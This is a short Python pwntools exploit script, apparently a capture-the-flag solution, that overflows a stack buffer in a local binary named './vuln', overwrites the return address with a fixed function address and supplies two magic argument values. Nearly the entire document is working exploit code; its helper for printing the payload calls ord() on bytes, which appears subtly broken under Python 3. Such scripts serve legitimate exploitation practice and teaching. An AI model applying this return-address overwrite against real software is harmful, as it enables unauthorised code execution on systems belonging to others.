from pwn import *

def escapeString(payload):
    return '{}'.format(''.join(['\\x{:02x}'.format(ord(c)) for c in payload]))

p = process('./vuln')

# Uncomment for debugging
#gdb.attach(p)

print(p.recvline().decode())

payload = b'A' * cyclic_find(0x62616177) + p32(0x080485e6) + b'AAAA' + p32(0xdeadbeef) + p32(0xc0ded00d)
p.sendline(payload)

print(p.recvall().decode('utf-8', 'replace'))
print('payload:\n' + escapeString(payload))
